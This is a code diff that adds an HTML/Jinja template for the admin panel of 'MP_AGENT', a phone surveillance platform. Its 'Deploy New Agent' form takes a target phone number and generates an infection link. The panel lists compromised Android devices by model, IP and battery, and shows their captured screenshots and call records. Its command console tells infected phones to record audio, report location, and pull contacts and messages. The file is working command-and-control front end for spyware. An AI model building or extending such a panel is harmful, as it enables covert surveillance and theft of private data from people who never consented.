@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MP_AGENT - Admin Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --primary: #667eea;
+            --secondary: #764ba2;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
+            --dark: #1a1a1a;
+            --light: #2d2d2d;
+            --lighter: #3d3d3d;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--dark); color: white; line-height: 1.6; }
+        
+        /* Header & Navigation */
+        .header { background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%); padding: 20px; text-align: center; }
+        .nav { background: var(--light); padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        .nav a { color: white; text-decoration: none; padding: 10px 20px; border-radius: 6px; transition: background 0.3s; margin: 5px; }
+        .nav a:hover { background: rgba(255,255,255,0.1); }
+        
+        /* Stats Grid */
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 25px; }
+        .stat-card { background: var(--light); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: transform 0.3s; }
+        .stat-card:hover { transform: translateY(-5px); }
+        .stat-number { font-size: 2.5em; font-weight: bold; margin-bottom: 8px; }
+        
+        /* Sections */
+        .section { background: var(--light); margin: 25px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .section h2 { margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid var(--primary); }
+        
+        /* Grid Layouts */
+        .agent-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
+        
+        /* Cards */
+        .agent-card, .data-card { background: var(--lighter); padding: 20px; border-radius: 10px; transition: transform 0.3s; }
+        .agent-card:hover, .data-card:hover { transform: translateY(-3px); }
+        .screenshot-item { background: var(--lighter); padding: 15px; border-radius: 10px; text-align: center; transition: transform 0.3s; }
+        .screenshot-item:hover { transform: scale(1.05); }
+        .screenshot-img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; background: var(--light); }
+        
+        /* Forms */
+        .deploy-form { background: var(--lighter); padding: 25px; border-radius: 10px; margin-top: 20px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #ccc; font-weight: 600; }
+        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 12px; background: var(--light); border: 1px solid #555; color: white; border-radius: 8px; }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { outline: none; border-color: var(--primary); }
+        .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.3s; text-decoration: none; display: inline-block; }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-success { background: var(--success); color: white; }
+        .btn-danger { background: var(--danger); color: white; }
+        .btn-warning { background: var(--warning); color: black; }
+        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
+        
+        /* Platform Info */
+        .platform-info { background: var(--success); padding: 15px; border-radius: 8px; margin: 15px 25px; text-align: center; }
+        
+        /* Tables */
+        .data-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        .data-table th, .data-table td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
+        .data-table th { background: var(--lighter); color: var(--primary); }
+        .data-table tr:hover { background: rgba(255,255,255,0.05); }
+        
+        /* Status Indicators */
+        .status-active { color: var(--success); }
+        .status-inactive { color: var(--danger); }
+        .status-pending { color: var(--warning); }
+        
+        /* Command Console */
+        .command-console { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; height: 200px; overflow-y: auto; margin-top: 15px; }
+        .command-input { display: flex; gap: 10px; margin-top: 15px; }
+        .command-input select, .command-input input { flex: 1; }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .nav { flex-direction: column; }
+            .stats { grid-template-columns: 1fr; }
+            .agent-grid, .screenshot-grid, .data-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎯 MP_AGENT PLATFORM</h1>
+        <p>Complete Surveillance Control Center</p>
+    </div>
+
+    <div class="nav">
+        <div>
+            <a href="/admin">📊 Dashboard</a>
+            <a href="/admin#agents">📱 Agents</a>
+            <a href="/admin#screenshots">🖼️ Screenshots</a>
+            <a href="/admin#calls">📞 Calls</a>
+            <a href="/admin#deploy">🚀 Deploy</a>
+            <a href="/admin#commands">⚡ Commands</a>
+            <a href="/admin#logs">📋 Logs</a>
+        </div>
+        <div>
+            <span>Welcome, <strong>{{ session.username }}</strong></span>
+            <a href="/logout" class="btn btn-danger">🚪 Logout</a>
+        </div>
+    </div>
+
+    <div class="platform-info">
+        <strong>🌐 Platform URL:</strong> {{ platform_url }} | 
+        <strong>Status:</strong> 🟢 ONLINE | 
+        <strong>Agents:</strong> {{ stats.active_agents }} Active
+    </div>
+
+    <!-- Statistics -->
+    <div class="stats">
+        <div class="stat-card">
+            <div class="stat-number" style="color: var(--success);">{{ stats.active_agents }}</div>
+            <div>Active Agents</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" style="color: var(--primary);">{{ stats.total_screenshots }}</div>
+            <div>Screenshots Captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" style="color: var(--warning);">{{ stats.total_calls }}</div>
+            <div>Call Records</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" style="color: var(--secondary);">{{ stats.total_deployments }}</div>
+            <div>Deployments</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" style="color: var(--danger);">{{ stats.pending_commands }}</div>
+            <div>Pending Commands</div>
+        </div>
+    </div>
+
+    <!-- Active Agents Section -->
+    <div class="section" id="agents">
+        <h2>📱 Active Agents ({{ agents|length }})</h2>
+        {% if agents %}
+        <div class="agent-grid">
+            {% for agent in agents %}
+            <div class="agent-card">
+                <h3>{{ agent['agent_id'] }}</h3>
+                <p><strong>Model:</strong> {{ agent['phone_model'] or 'Unknown' }}</p>
+                <p><strong>Android:</strong> {{ agent['android_version'] or 'Unknown' }}</p>
+                <p><strong>IP:</strong> {{ agent['ip_address'] or 'Unknown' }}</p>
+                <p><strong>First Seen:</strong> {{ agent['first_seen'] or 'Never' }}</p>
+                <p><strong>Last Seen:</strong> {{ agent['last_seen'] or 'Never' }}</p>
+                <p><strong>Screenshots:</strong> {{ agent['screenshot_count'] }}</p>
+                <p><strong>Calls:</strong> {{ agent['call_records'] }}</p>
+                <p><strong>Battery:</strong> 
+                    {% if agent['battery_level'] %}
+                        {% if agent['battery_level'] > 70 %}🟢
+                        {% elif agent['battery_level'] > 30 %}🟡
+                        {% else %}🔴
+                        {% endif %}
+                        {{ agent['battery_level'] }}%
+                    {% else %}Unknown{% endif %}
+                </p>
+                <div style="margin-top: 15px; display: flex; gap: 10px;">
+                    <a href="/admin/clear_agent/{{ agent['agent_id'] }}" class="btn btn-danger" 
+                       onclick="return confirm('Delete agent {{ agent['agent_id'] }}?')">🗑️ Remove</a>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 40px; color: #888;">No active agents. Deploy agents to see them here!</p>
+        {% endif %}
+    </div>
+
+    <!-- Screenshots Section -->
+    <div class="section" id="screenshots">
+        <h2>🖼️ Recent Screenshots</h2>
+        {% if screenshots %}
+        <div class="screenshot-grid">
+            {% for screenshot in screenshots %}
+            <div class="screenshot-item">
+                <a href="/media/screenshot/{{ screenshot['id'] }}" target="_blank">
+                    <img src="/media/screenshot/{{ screenshot['id'] }}" alt="Screenshot" class="screenshot-img"
+                         onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDIwMCAxMjAiIGZpbGw9IiMzZDNkM2QiPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTIwIi8+PHRleHQgeD0iMTAwIiB5PSI2MCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0IiBmaWxsPSIjODg4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5TY3JlZW5zaG90IE5vdCBGb3VuZDwvdGV4dD48L3N2Zz4='">
+                </a>
+                <div style="margin-top: 10px;">
+                    <strong>{{ screenshot['agent_id'] }}</strong><br>
+                    <small>{{ screenshot['timestamp'] }}</small><br>
+                    <small>{{ screenshot['phone_model'] or 'Unknown Device' }}</small>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 40px; color: #888;">No screenshots yet. Agents will upload automatically.</p>
+        {% endif %}
+    </div>
+
+    <!-- Deployment Section -->
+    <div class="section" id="deploy">
+        <h2>🚀 Deploy New Agent</h2>
+        <div class="deploy-form">
+            <form action="/deploy" method="post">
+                <div class="form-group">
+                    <label for="phone_number">Target Phone Number</label>
+                    <input type="text" id="phone_number" name="phone_number" placeholder="+1234567890" required>
+                </div>
+                <div class="form-group">
+                    <label for="agent_id">Agent ID (optional)</label>
+                    <input type="text" id="agent_id" name="agent_id" placeholder="agent_001">
+                </div>
+                <button type="submit" class="btn btn-primary">🎯 Generate Deployment Link</button>
+            </form>
+        </div>
+        
+        <h3 style="margin-top: 30px;">Recent Deployments</h3>
+        {% if deployments %}
+        <div class="data-table-container">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Target Phone</th>
+                        <th>Agent ID</th>
+                        <th>Status</th>
+                        <th>Time</th>
+                        <th>Message</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for deployment in deployments %}
+                    <tr>
+                        <td>{{ deployment['target_phone'] }}</td>
+                        <td>{{ deployment['agent_id'] }}</td>
+                        <td>
+                            <span class="status-{{ deployment['status'] }}">
+                                {{ deployment['status']|upper }}
+                            </span>
+                        </td>
+                        <td>{{ deployment['timestamp'] }}</td>
+                        <td><em>{{ deployment['message_sent'][:50] }}...</em></td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No deployments yet</p>
+        {% endif %}
+    </div>
+
+    <!-- Command Section -->
+    <div class="section" id="commands">
+        <h2>⚡ Send Command</h2>
+        <form action="/admin/command" method="post">
+            <div class="form-group">
+                <label for="agent_id_cmd">Select Agent</label>
+                <select id="agent_id_cmd" name="agent_id" required>
+                    <option value="">-- Select Agent --</option>
+                    {% for agent in agents %}
+                    <option value="{{ agent['agent_id'] }}">{{ agent['agent_id'] }} ({{ agent['phone_model'] }})</option>
+                    {% endfor %}
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="command">Command</label>
+                <select id="command" name="command" required>
+                    <option value="capture_screenshot">📸 Capture Screenshot</option>
+                    <option value="get_device_info">📱 Get Device Info</option>
+                    <option value="get_location">📍 Get Location</option>
+                    <option value="record_audio">🎤 Record Audio</option>
+                    <option value="get_contacts">👥 Get Contacts</option>
+                    <option value="get_messages">💬 Get Messages</option>
+                    <option value="custom">Custom Command</option>
+                </select>
+            </div>
+            <div class="form-group" id="custom_command_div" style="display: none;">
+                <label for="custom_command">Custom Command</label>
+                <input type="text" id="custom_command" name="custom_command" placeholder="Enter custom command">
+            </div>
+            <button type="submit" class="btn btn-warning">🚀 Send Command</button>
+        </form>
+
+        <h3 style="margin-top: 30px;">Recent Commands</h3>
+        {% if commands %}
+        <div class="data-table-container">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Agent ID</th>
+                        <th>Command</th>
+                        <th>Status</th>
+                        <th>Time</th>
+                        <th>Result</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for command in commands %}
+                    <tr>
+                        <td>{{ command['agent_id'] }}</td>
+                        <td><code>{{ command['command'] }}</code></td>
+                        <td>
+                            <span class="status-{{ command['status'] }}">
+                                {{ command['status']|upper }}
+                            </span>
+                        </td>
+                        <td>{{ command['timestamp'] }}</td>
+                        <td>{{ command['result'] or '--' }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No commands sent yet</p>
+        {% endif %}
+    </div>
+
+    <!-- System Logs -->
+    <div class="section" id="logs">
+        <h2>📋 System Logs</h2>
+        {% if logs %}
+        <div class="command-console">
+            {% for log in logs %}
+            <div>
+                <span style="color: 
+                    {% if log['level'] == 'ERROR' %}#ff4444
+                    {% elif log['level'] == 'WARNING' %}#ffaa00
+                    {% else %}#00ff00
+                    {% endif %}">
+                    [{{ log['timestamp'] }}] {{ log['level'] }}:
+                </span>
+                {{ log['message'] }}
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No system logs</p>
+        {% endif %}
+    </div>
+
+    <script>
+        // Command type toggle
+        document.getElementById('command').addEventListener('change', function() {
+            const customDiv = document.getElementById('custom_command_div');
+            if (this.value === 'custom') {
+                customDiv.style.display = 'block';
+            } else {
+                customDiv.style.display = 'none';
+            }
+        });
+
+        // Auto-refresh every 30 seconds
+        setTimeout(() => window.location.reload(), 30000);
+
+        // Smooth scrolling for navigation
+        document.querySelectorAll('.nav a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
